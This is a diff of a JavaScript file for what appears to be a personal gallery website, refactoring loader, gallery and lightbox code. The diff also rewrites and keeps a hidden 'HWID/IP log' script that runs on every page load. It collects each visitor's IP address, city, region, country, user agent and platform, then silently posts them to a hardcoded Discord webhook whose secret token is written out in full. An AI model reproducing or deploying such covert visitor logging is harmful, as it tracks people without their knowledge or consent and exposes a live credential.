@@ -1,31 +1,38 @@
-// Loader + Galeri JS Fix
+window.addEventListener("load", () => {
+  setTimeout(() => {
+    const loader = document.getElementById("loader");
+    if (loader) {
+      loader.classList.add("fade-out");
+    }
+  }, 2500);
+});
 
-// Loader fade out setelah halaman selesai dimuat window.addEventListener("load", function () { // Scroll ke atas setTimeout(function () { window.scrollTo({ top: 0, left: 0, behavior: 'instant' }); }, 50);
+	//Galeri
+ // Menampilkan galeri
+document.getElementById("openGallery").onclick = function () {
+  document.getElementById("fullscreenGallery").classList.add("show"); // Menambahkan kelas 'show' untuk efek membuka galeri
+};
 
-// Mulai fade out loader setTimeout(function () { const loader = document.getElementById("loader"); loader.classList.add("fade-out");
+// Menutup galeri
+document.getElementById("closeGallery").onclick = function () {
+  document.getElementById("fullscreenGallery").classList.remove("show"); // Menghapus kelas 'show' untuk menutup galeri
+};
 
-// Setelah animasi selesai, sembunyikan loader
-setTimeout(() => {
-  loader.style.display = "none";
-}, 500); // Cocokkan dengan durasi transisi fade CSS
+// Menampilkan lightbox
+document.querySelectorAll(".gallery-grid img").forEach(img => {
+  img.addEventListener("click", () => {
+    const lightbox = document.getElementById("lightbox");
+    const lightboxImg = lightbox.querySelector("img");
+    lightboxImg.src = img.src; // Set src image lightbox dengan src image yang diklik
+    lightbox.style.display = "block"; // Menampilkan lightbox
+  });
+});
 
-}, 2000); // Waktu tunggu sebelum loader fade });
-
-// Galeri buka tutup fullscreen const openGalleryBtn = document.getElementById("openGallery"); const closeGalleryBtn = document.getElementById("closeGallery"); const fullscreenGallery = document.getElementById("fullscreenGallery");
-
-if (openGalleryBtn && closeGalleryBtn && fullscreenGallery) { openGalleryBtn.addEventListener("click", () => { fullscreenGallery.classList.add("show"); });
-
-closeGalleryBtn.addEventListener("click", () => { fullscreenGallery.classList.remove("show"); }); }
-
-// Lightbox untuk gambar const lightbox = document.getElementById("lightbox"); const lightboxImg = lightbox?.querySelector("img");
-
-document.querySelectorAll(".gallery-grid img").forEach(img => { img.addEventListener("click", () => { if (lightbox && lightboxImg) { lightboxImg.src = img.src; lightbox.style.display = "block"; } }); });
-
-// Tombol tutup lightbox const closeLightbox = document.querySelector(".close-lightbox");
-
-if (closeLightbox && lightbox) { closeLightbox.addEventListener("click", () => { lightbox.style.display = "none"; }); }
-
-
+// Menutup lightbox
+document.querySelector(".close-lightbox").addEventListener("click", () => {
+  const lightbox = document.getElementById("lightbox");
+  lightbox.style.display = "none"; // Menutup lightbox
+});
 
  // Script Galeri
 
@@ -103,49 +110,58 @@ window.onload = function() {
 
 	
   // Script Log HWID, Device info, User Agent, dan IP Log
-
-    (async () => {
-  try {
-    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-    const locData = await fetch('https://ipapi.co/json/').then(res => res.json());
-
-    const ip = ipData.ip;
+    fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ip = data.ip;
     const userAgent = navigator.userAgent;
     const device = navigator.platform;
     const date = new Date().toLocaleString();
-    const location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
 
-    const embed = {
-      embeds: [{
-        title: "WEB ACCESS LOG",
-        color: 15548997,
-        fields: [
-          { name: "IP Address", value: ip, inline: true },
-          { name: "Device", value: device, inline: true },
-          { name: "User Agent", value: userAgent, inline: false },
-          { name: "Location", value: location, inline: true },
-          { name: "Date", value: date, inline: true }
-        ],
-        footer: { text: "HWID Log" }
-      }]
-    };
+    // Ambil lokasi, lalu kirim webhook
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(locData => {
+        const location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
 
-    const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
+        // Siapkan payload embed Discord
+        const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';
 
-    const response = await fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
-    });
+        const embed = {
+          embeds: [{
+            title: "WEB ACCESS LOG",
+            color: 15548997,
+            fields: [
+              { name: "IP Address", value: ip, inline: true },
+              { name: "Device", value: device, inline: true },
+              { name: "User Agent", value: userAgent, inline: false },
+              { name: "Location", value: location, inline: true },
+              { name: "Date", value: date, inline: true }
+            ],
+            footer: { text: "HWID Log" }
+          }]
+        };
 
-    if (response.ok) {
-      console.log('Log successfully sent to Discord');
-    } else {
-      console.error('Failed to send log', await response.text());
-    }
-  } catch (err) {
-    console.error('Logging failed:', err);
-  }
-})();
-
+        // Kirim ke Discord
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embed)
+        }).then(response => {
+          if (response.ok) {
+            console.log('Log berhasil dikirim ke Discord');
+          } else {
+            console.error('Gagal mengirim log ke Discord');
+          }
+        }).catch(error => {
+          console.error('Fetch error:', error);
+        });
+      })
+      .catch(error => {
+        console.error('Gagal mengambil lokasi:', error);
+      });
+  })
+  .catch(error => {
+    console.error('Gagal mengambil IP:', error);
+  });
   // Script Log HWID, Device info, User Agent, dan IP Log
